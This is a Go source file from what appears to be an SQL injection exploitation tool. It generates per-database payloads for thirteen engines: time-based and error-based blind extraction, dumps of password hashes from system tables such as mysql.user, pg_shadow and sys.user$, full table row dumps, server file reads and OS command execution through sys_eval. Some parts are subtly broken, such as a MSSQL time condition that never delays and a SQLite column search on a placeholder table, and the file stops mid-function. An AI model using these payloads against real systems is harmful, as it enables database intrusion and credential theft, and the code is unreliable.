package core

import (
	"fmt"
	"strings"
)

// Dialect contains the SQL syntax differences that matter for extraction.
// Every function returns a scalar SQL expression unless documented otherwise.
type Dialect struct {
	Name          string
	Aliases       []string
	Quote         func(string) string
	Str           func(string) string
	Concat        func(...string) string
	Length        func(string) string
	Substr        func(string, int, int) string
	ASCII         func(string) string
	Marker        func(string) string
	SleepExpr     func(int) string
	TimeCondition func(string, int) string
	ErrorExpr     func(string) (string, bool)
	Databases     func() string
	Tables        func(string) string
	Columns       func(string, string) string
	CurrentDB     func() string
	Version       func() string
	User          func() string
	Hostname      func() string
	IsDBA         func() string
	Privileges    func() string
	Users         func() string
	Passwords     func() string
	Roles         func() string
	RowCount      func(string, string) string
	DumpRow       func(string, string, []string, int) string
	FileRead      func(string) (string, bool)
	OSCmd         func(string) (string, bool)
	SearchTables  func(string) string
	SearchColumns func(string) string
	TableColumns  func(string, string) string
	AllTables     func() string
	AllColumns    func() string
}

func quoteBacktick(s string) string {
	return "`" + strings.ReplaceAll(s, "`", "``") + "`"
}

func quoteDouble(s string) string {
	return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
}

func quoteBracket(s string) string {
	return "[" + strings.ReplaceAll(s, "]", "]]") + "]"
}

func literal(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

func mysqlLiteral(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, "'", "''")
	return "'" + s + "'"
}

func concatFunc(name string) func(...string) string {
	return func(parts ...string) string {
		if len(parts) == 0 {
			return "''"
		}
		if len(parts) == 1 {
			return parts[0]
		}
		return fmt.Sprintf("%s(%s)", name, strings.Join(parts, ","))
	}
}

func concatPipe(parts ...string) string {
	if len(parts) == 0 {
		return "''"
	}
	return "(" + strings.Join(parts, "||") + ")"
}

func markerPipe(expr string) string {
	return "('~'||" + expr + "||'~')"
}

func markerFunc(expr string) string {
	return "CONCAT('~'," + expr + ",'~')"
}

func defaultAliases(name string, aliases ...string) []string {
	return append([]string{name}, aliases...)
}

// Dialects returns all supported dialects in detection order.
func Dialects() []*Dialect {
	return []*Dialect{
		mysqlDialect(),
		postgresDialect(),
		mssqlDialect(),
		oracleDialect(),
		sqliteDialect(),
		clickhouseDialect(),
		duckdbDialect(),
		cockroachDialect(),
		snowflakeDialect(),
		bigqueryDialect(),
		firebirdDialect(),
		sybaseDialect(),
		h2Dialect(),
	}
}

func GetDialect(name string) *Dialect {
	name = strings.TrimSpace(name)
	if name == "" || strings.EqualFold(name, "auto") || strings.EqualFold(name, "unknown") {
		return nil
	}
	for _, d := range Dialects() {
		if strings.EqualFold(d.Name, name) {
			return d
		}
		for _, a := range d.Aliases {
			if strings.EqualFold(a, name) {
				return d
			}
		}
	}
	return nil
}

func mysqlDialect() *Dialect {
	return &Dialect{
		Name:    "MySQL",
		Aliases: defaultAliases("MySQL", "MariaDB", "Percona"),
		Quote:   quoteBacktick,
		Str:     mysqlLiteral,
		Concat:  concatFunc("CONCAT"),
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("SLEEP(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN SLEEP(%d) ELSE 0 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))", expr), true
		},
		Databases: func() string {
			return "(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x1e) FROM information_schema.schemata)"
		},
		Tables: func(db string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM information_schema.tables WHERE table_schema=%s)", literal(db))
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
		},
		CurrentDB: func() string { return "DATABASE()" },
		Version:   func() string { return "@@VERSION" },
		User:      func() string { return "USER()" },
		Hostname:  func() string { return "@@hostname" },
		IsDBA: func() string {
			return "(SELECT COUNT(*) FROM information_schema.user_privileges WHERE GRANTEE=CONCAT('''',SUBSTRING_INDEX(USER(),'@',1),'''@''%''') AND PRIVILEGE_TYPE='SUPER')"
		},
		Privileges: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(GRANTEE,':',PRIVILEGE_TYPE) SEPARATOR 0x1e) FROM information_schema.user_privileges)"
		},
		Users: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(user,'@',host) SEPARATOR 0x1e) FROM mysql.user)"
		},
		Passwords: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(user,'@',host,':',authentication_string) SEPARATOR 0x1e) FROM mysql.user)"
		},
		Roles: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(USER,'@',HOST) SEPARATOR 0x1e) FROM mysql.user)"
		},
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.%s)", quoteBacktick(db), quoteBacktick(table))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("IFNULL(CAST(%s AS CHAR),'NULL')", quoteBacktick(c)))
			}
			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.%s LIMIT %d,1)", strings.Join(parts, ",0x1f,"), quoteBacktick(db), quoteBacktick(table), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("LOAD_FILE(%s)", mysqlLiteral(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return fmt.Sprintf("(SELECT sys_eval(%s))", mysqlLiteral(cmd)), true
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR 0x1e) FROM information_schema.tables WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
		},
		AllTables: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR 0x1e) FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys'))"
		},
		AllColumns: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys'))"
		},
	}
}

func postgresDialect() *Dialect {
	return &Dialect{
		Name:    "PostgreSQL",
		Aliases: defaultAliases("PostgreSQL", "Postgres", "CockroachDB"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatPipe,
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s FROM %d FOR %d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerPipe,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("pg_sleep(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT 1 FROM pg_sleep(%d)) ELSE 1 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT)", expr), true
		},
		Databases: func() string {
			return "(SELECT string_agg(datname,chr(30)) FROM pg_database WHERE datistemplate=false)"
		},
		Tables: func(db string) string {
			return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s)", literal(db))
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(db), literal(table))
		},
		CurrentDB: func() string { return "current_database()" },
		Version:   func() string { return "version()" },
		User:      func() string { return "current_user" },
		Hostname:  func() string { return "COALESCE(inet_server_addr()::text,'localhost')" },
		IsDBA: func() string {
			return "(SELECT CASE WHEN usesuper THEN 1 ELSE 0 END FROM pg_user WHERE usename=current_user)"
		},
		Privileges: func() string {
			return "(SELECT string_agg(privilege_type,chr(30)) FROM information_schema.role_table_grants WHERE grantee=current_user)"
		},
		Users: func() string {
			return "(SELECT string_agg(usename,chr(30)) FROM pg_user)"
		},
		Passwords: func() string {
			return "(SELECT string_agg(usename||':'||passwd,chr(30)) FROM pg_shadow)"
		},
		Roles: func() string {
			return "(SELECT string_agg(rolname,chr(30)) FROM pg_roles)"
		},
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s)", quoteDouble(table))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(%s::text,'NULL')", quoteDouble(c)))
			}
			return fmt.Sprintf("(SELECT %s FROM %s LIMIT 1 OFFSET %d)", strings.Join(parts, "||chr(31)||"), quoteDouble(table), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("pg_read_file(%s)", literal(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT string_agg(table_schema||'.'||table_name,chr(30)) FROM information_schema.tables WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT string_agg(table_schema||'.'||table_name||'.'||column_name,chr(30)) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT string_agg(column_name||':'||data_type,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(db), literal(table))
		},
		AllTables: func() string {
			return "(SELECT string_agg(table_schema||'.'||table_name,chr(30)) FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
		},
		AllColumns: func() string {
			return "(SELECT string_agg(table_schema||'.'||table_name||'.'||column_name,chr(30)) FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
		},
	}
}

func mssqlDialect() *Dialect {
	return &Dialect{
		Name:    "MSSQL",
		Aliases: defaultAliases("MSSQL", "SQLServer", "SQL Server"),
		Quote:   quoteBracket,
		Str:     literal,
		Concat:  concatFunc("CONCAT"),
		Length:  func(e string) string { return "LEN(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("WAITFOR DELAY '0:0:%d'", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN 1 ELSE 1 END", cond)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CONVERT(INT,CONCAT('~',(%s),'~'))", expr), true
		},
		Databases: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.databases)"
		},
		Tables: func(db string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM %s.sys.tables)", quoteBracket(db))
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(c.name,CHAR(30)) FROM %s.sys.columns c JOIN %s.sys.tables t ON c.object_id=t.object_id WHERE t.name=%s)", quoteBracket(db), quoteBracket(db), literal(table))
		},
		CurrentDB: func() string { return "DB_NAME()" },
		Version:   func() string { return "@@VERSION" },
		User:      func() string { return "SYSTEM_USER" },
		Hostname:  func() string { return "@@SERVERNAME" },
		IsDBA:     func() string { return "IS_SRVROLEMEMBER('sysadmin')" },
		Privileges: func() string {
			return "(SELECT STRING_AGG(permission_name,CHAR(30)) FROM fn_my_permissions(NULL,'SERVER'))"
		},
		Users: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.server_principals WHERE type IN ('S','U'))"
		},
		Passwords: func() string {
			return "(SELECT STRING_AGG(name||':'||password_hash,CHAR(30)) FROM sys.sql_logins)"
		},
		Roles: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.server_principals WHERE type='R')"
		},
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.dbo.%s)", quoteBracket(db), quoteBracket(table))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("ISNULL(CAST(%s AS NVARCHAR(MAX)),'NULL')", quoteBracket(c)))
			}
			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.dbo.%s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", strings.Join(parts, ",CHAR(31),"), quoteBracket(db), quoteBracket(table), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("(SELECT BulkColumn FROM OPENROWSET(BULK %s,SINGLE_CLOB) AS x)", literal(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return fmt.Sprintf("(SELECT xp_cmdshell_result FROM OPENROWSET(BULK 'x',SINGLE_CLOB) AS x)", false), false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM sys.tables WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM sys.columns WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(c.name||':'||t.name,CHAR(30)) FROM %s.sys.columns c JOIN %s.sys.types t ON c.user_type_id=t.user_type_id WHERE c.object_id=OBJECT_ID(%s))", quoteBracket(db), quoteBracket(db), literal(db+"."+table))
		},
		AllTables: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.tables)"
		},
		AllColumns: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.columns)"
		},
	}
}

func oracleDialect() *Dialect {
	return &Dialect{
		Name:    "Oracle",
		Aliases: defaultAliases("Oracle"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatPipe,
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerPipe,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("dbms_pipe.receive_message(('a'),%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN dbms_pipe.receive_message(('a'),%d) ELSE 1 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=UTL_INADDR.GET_HOST_NAME((%s))", expr), true
		},
		Databases: func() string {
			return "(SELECT LISTAGG(username,CHR(30)) WITHIN GROUP (ORDER BY username) FROM all_users)"
		},
		Tables: func(db string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=%s)", literal(strings.ToUpper(db)))
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=%s AND table_name=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
		},
		CurrentDB: func() string { return "SYS_CONTEXT('USERENV','CURRENT_SCHEMA')" },
		Version:   func() string { return "(SELECT banner FROM v$version WHERE ROWNUM=1)" },
		User:      func() string { return "USER" },
		Hostname:  func() string { return "SYS_CONTEXT('USERENV','SERVER_HOST')" },
		IsDBA: func() string {
			return "(SELECT CASE WHEN COUNT(*)>0 THEN 1 ELSE 0 END FROM user_role_privs WHERE granted_role='DBA')"
		},
		Privileges: func() string {
			return "(SELECT LISTAGG(privilege,CHR(30)) WITHIN GROUP (ORDER BY privilege) FROM user_sys_privs)"
		},
		Users: func() string {
			return "(SELECT LISTAGG(username,CHR(30)) WITHIN GROUP (ORDER BY username) FROM all_users)"
		},
		Passwords: func() string {
			return "(SELECT LISTAGG(name||':'||password,CHR(30)) WITHIN GROUP (ORDER BY name) FROM sys.user$)"
		},
		Roles: func() string {
			return "(SELECT LISTAGG(granted_role,CHR(30)) WITHIN GROUP (ORDER BY granted_role) FROM user_role_privs)"
		},
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.%s)", quoteDouble(strings.ToUpper(db)), quoteDouble(strings.ToUpper(table)))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("NVL(TO_CHAR(%s),'NULL')", quoteDouble(strings.ToUpper(c))))
			}
			return fmt.Sprintf("(SELECT %s FROM (SELECT t.*,ROWNUM rn FROM %s.%s t) WHERE rn=%d)", strings.Join(parts, "||CHR(31)||"), quoteDouble(strings.ToUpper(db)), quoteDouble(strings.ToUpper(table)), offset+1)
		},
		FileRead: func(path string) (string, bool) {
			return "", false
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE table_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_name||'.'||column_name,CHR(30)) WITHIN GROUP (ORDER BY table_name,column_name) FROM all_tab_columns WHERE column_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=%s AND table_name=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
		},
		AllTables: func() string {
			return "(SELECT LISTAGG(owner||'.'||table_name,CHR(30)) WITHIN GROUP (ORDER BY owner,table_name) FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM'))"
		},
		AllColumns: func() string {
			return "(SELECT LISTAGG(owner||'.'||table_name||'.'||column_name,CHR(30)) WITHIN GROUP (ORDER BY owner,table_name,column_name) FROM all_tab_columns WHERE owner NOT IN ('SYS','SYSTEM'))"
		},
	}
}

// sqliteSleep burns CPU in a recursive CTE because SQLite has no sleep
// function. One million rows take roughly 0.7 seconds on a typical machine,
// so the row count is scaled to the requested delay in seconds.
func sqliteSleep(n int) string {
	if n < 1 {
		n = 1
	}
	rows := n * 1500000
	return fmt.Sprintf("(WITH RECURSIVE hackit_sleep(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM hackit_sleep WHERE x<%d) SELECT count(*) FROM hackit_sleep)", rows)
}

func sqliteDialect() *Dialect {
	return &Dialect{
		Name:    "SQLite",
		Aliases: defaultAliases("SQLite", "SQLite3"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatPipe,
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "UNICODE(" + e + ")" },
		Marker:  markerPipe,
		SleepExpr: func(n int) string {
			return sqliteSleep(n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN %s ELSE 1 END", cond, sqliteSleep(n))
		},
		ErrorExpr: func(expr string) (string, bool) {
			return "", false
		},
		Databases: func() string {
			return "(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_database_list)"
		},
		Tables: func(db string) string {
			return "(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table')"
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_table_info(%s))", literal(table))
		},
		CurrentDB: func() string { return "'main'" },
		Version:   func() string { return "sqlite_version()" },
		User:      func() string { return "'sqlite'" },
		Hostname:  func() string { return "'localhost'" },
		IsDBA:     func() string { return "0" },
		Privileges: func() string {
			return "''"
		},
		Users: func() string {
			return "''"
		},
		Passwords: func() string {
			return "''"
		},
		Roles: func() string {
			return "''"
		},
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s)", quoteDouble(table))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS TEXT),'NULL')", quoteDouble(c)))
			}
			return fmt.Sprintf("(SELECT %s FROM %s LIMIT 1 OFFSET %d)", strings.Join(parts, "||char(31)||"), quoteDouble(table), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("readfile(%s)", literal(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table' AND name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_table_info('x') WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(name||':'||type,char(30)) FROM pragma_table_info(%s))", literal(table))
		},
		AllTables: func() string {
			return "(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table')"
		},
		AllColumns: func() string {
			return "(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_table_info('x'))"
		},
	}
}

func clickhouseDialect() *Dialect {
	return &Dialect{
		Name:    "ClickHouse",
		Aliases: defaultAliases("ClickHouse"),
		Quote:   quoteBacktick,
		Str:     literal,
		Concat:  concatFunc("concat"),
		Length:  func(e string) string { return "length(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("substring(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ascii(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("sleep(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN sleep(%d) ELSE 0 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=toUInt8(CONCAT('~',(%s),'~'))", expr), true
		},
		Databases: func() string {
			return "(SELECT groupArray(name) FROM system.databases)"
		},
		Tables: func(db string) string {
			return fmt.Sprintf("(SELECT groupArray(name) FROM system.tables WHERE database=%s)", literal(db))
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT groupArray(name) FROM system.columns WHERE database=%s AND table=%s)", literal(db), literal(table))
		},
		CurrentDB: func() string { return "currentDatabase()" },
		Version:   func() string { return "version()" },
		User:      func() string { return "currentUser()" },
		Hostname:  func() string { return "hostName()" },
		IsDBA:     func() string { return "1" },
		Privileges: func() string {
			return "(SELECT groupArray(privilege) FROM system.grants)"
		},
		Users: func() string {
			return "(SELECT groupArray(name) FROM system.users)"
		},
		Passwords: func() string {
			return "''"
		},
		Roles: func() string {
			return "(SELECT groupArray(name) FROM system.roles)"
		},
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT count() FROM %s.%s)", quoteBacktick(db), quoteBacktick(table))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("ifNull(toString(%s),'NULL')", quoteBacktick(c)))
			}
			return fmt.Sprintf("(SELECT concat(%s) FROM %s.%s LIMIT 1 OFFSET %d)", strings.Join(parts, ",char(31),"), quoteBacktick(db), quoteBacktick(table), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("file(%s)", literal(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT groupArray(concat(database,'.',name)) FROM system.tables WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT groupArray(concat(database,'.',table,'.',name)) FROM system.columns WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT groupArray(concat(name,':',type)) FROM system.columns WHERE database=%s AND table=%s)", literal(db), literal(table))
		},
		AllTables: func() string {
			return "(SELECT groupArray(concat(database,'.',name)) FROM system.tables)"
		},
		AllColumns: func() string {
			return "(SELECT groupArray(concat(database,'.',table,'.',name)) FROM system.columns)"
		},
	}
}

func duckdbDialect() *Dialect {
	d := postgresDialect()
	d.Name = "DuckDB"
	d.Aliases = defaultAliases("DuckDB")
	d.Databases = func() string { return "(SELECT string_agg(database_name,chr(30)) FROM duckdb_databases())" }
	d.Tables = func(db string) string {
		return "(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema='main')"
	}
	d.Columns = func(db, table string) string {
		return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_name=%s)", literal(table))
	}
	d.CurrentDB = func() string { return "current_database()" }
	d.Version = func() string { return "version()" }
	d.User = func() string { return "current_user" }
	d.Hostname = func() string { return "'localhost'" }
	d.IsDBA = func() string { return "1" }
	d.RowCount = func(db, table string) string {
		return fmt.Sprintf("(SELECT COUNT(*) FROM %s)", quoteDouble(table))
	}
	d.DumpRow = func(db, table string, cols []string, offset int) string {
		parts := make([]string, 0, len(cols))
		for _, c := range cols {
			parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR),'NULL')", quoteDouble(c)))
		}
		return fmt.Sprintf("(SELECT %s FROM %s LIMIT 1 OFFSET %d)", strings.Join(parts, "||chr(31)||"), quoteDouble(table), offset)
	}
	return d
}

func cockroachDialect() *Dialect {
	d := postgresDialect()
	d.Name = "CockroachDB"
	d.Aliases = defaultAliases("CockroachDB", "Cockroach")
	d.Databases = func() string {
		return "(SELECT string_agg(database_name,chr(30)) FROM [SHOW DATABASES])"
	}
	d.Tables = func(db string) string {
		return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s)", literal("public"))
	}
	d.CurrentDB = func() string { return "current_database()" }
	d.Version = func() string { return "version()" }
	return d
}

func snowflakeDialect() *Dialect {
	return &Dialect{
		Name:    "Snowflake",
		Aliases: defaultAliases("Snowflake"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatFunc("CONCAT"),
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("SYSTEM$WAIT(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN SYSTEM$WAIT(%d) ELSE 1 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT)", expr), true
		},
		Databases: func() string {
			return "(SELECT LISTAGG(database_name,CHAR(30)) WITHIN GROUP (ORDER BY database_name) FROM information_schema.databases)"
		},
		Tables: func(db string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_name) FROM %s.information_schema.tables WHERE table_schema='PUBLIC')", quoteDouble(db))
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM %s.information_schema.columns WHERE table_name=%s)", quoteDouble(db), literal(strings.ToUpper(table)))
		},
		CurrentDB: func() string { return "CURRENT_DATABASE()" },
		Version:   func() string { return "CURRENT_VERSION()" },
		User:      func() string { return "CURRENT_USER()" },
		Hostname:  func() string { return "CURRENT_CLIENT()" },
		IsDBA:     func() string { return "1" },
		Privileges: func() string {
			return "(SELECT LISTAGG(privilege,CHAR(30)) WITHIN GROUP (ORDER BY privilege) FROM information_schema.applicable_roles)"
		},
		Users: func() string {
			return "(SELECT LISTAGG(name,CHAR(30)) WITHIN GROUP (ORDER BY name) FROM SNOWFLAKE.ACCOUNT_USAGE.USERS)"
		},
		Passwords: func() string {
			return "''"
		},
		Roles: func() string {
			return "(SELECT LISTAGG(role,CHAR(30)) WITHIN GROUP (ORDER BY role) FROM information_schema.applicable_roles)"
		},
		RowCount: func(db, table string) string {
